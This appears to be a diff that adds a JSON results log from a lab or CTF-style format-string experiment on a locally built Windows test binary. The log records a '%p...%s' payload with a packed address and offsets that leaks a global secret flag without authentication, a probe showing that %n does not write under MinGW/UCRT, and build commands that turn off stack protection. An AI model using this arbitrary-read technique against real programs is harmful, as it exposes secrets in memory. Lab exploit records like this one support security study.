@@ -1,0 +1,26 @@
+{
+  "title": "格式化串任意读：未认证读出全局 secret；并记录 UCRT 下 %n 不写回的边界",
+  "leak": {
+    "secret_addr": "0x140003000",
+    "payload": "%p%p%p%p%p%s",
+    "address_buffer_offset": 16,
+    "address_arg_position": 6,
+    "rc": 0,
+    "leaked_flag": true,
+    "authenticated": false,
+    "stdout_excerpt": "%s 输出中出现 FLAG{fmt_string_arbitrary_read_works}，随后程序打印 denied"
+  },
+  "percent_n": {
+    "probe": "printf(\"abc%n\n\", &x)",
+    "observed": "abcx=0",
+    "conclusion": "MinGW/UCRT 的 printf 不执行 %n（x 仍为 0），因此 Windows 目标不能照搬 glibc 的 %n 任意写"
+  },
+  "commands": [
+    "gcc -O0 -fno-stack-protector -no-pie -o artifacts/fmt_read.exe input/fmt_read.c",
+    "gcc -O0 -fno-stack-protector -no-pie -o artifacts/percent_n.exe input/percent_n.c",
+    "nm artifacts/fmt_read.exe > artifacts/nm.txt",
+    "python: 构造 '%p%p%p%p%p%s' + 16B 对齐 + p64(secret)，管道送入 fmt_read.exe > artifacts/leak_result.json",
+    "./artifacts/percent_n.exe > artifacts/percent_n_result.txt"
+  ],
+  "all_ok": true
+}
